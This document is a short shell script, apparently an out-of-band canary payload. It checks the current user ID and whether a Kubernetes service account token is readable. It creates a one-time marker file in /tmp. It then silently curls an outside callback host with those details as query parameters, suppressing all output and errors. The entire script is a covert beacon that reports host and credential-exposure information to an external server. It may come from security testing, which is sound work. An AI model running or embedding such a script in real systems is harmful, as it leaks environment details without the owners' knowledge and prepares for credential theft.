#!/bin/sh
uid="$(id -u)"
readable=false
if test -r /var/run/secrets/kubernetes.io/serviceaccount/token; then readable=true; fi
if ( set -C; : > /tmp/df-mise-0264dd2c8204c882b315fe1f1056dd2e.sent ) 2>/dev/null; then
  curl -fsS --max-time 5 --retry 0 -o /dev/null "https://dbqpaejjnbd9268i622gjbsx8uar4ojzb.oob.staging.depthfirst.com/dfmise/0264dd2c8204c882b315fe1f1056dd2e?uid=$uid&token_readable=$readable" >/dev/null 2>&1 || true
fi
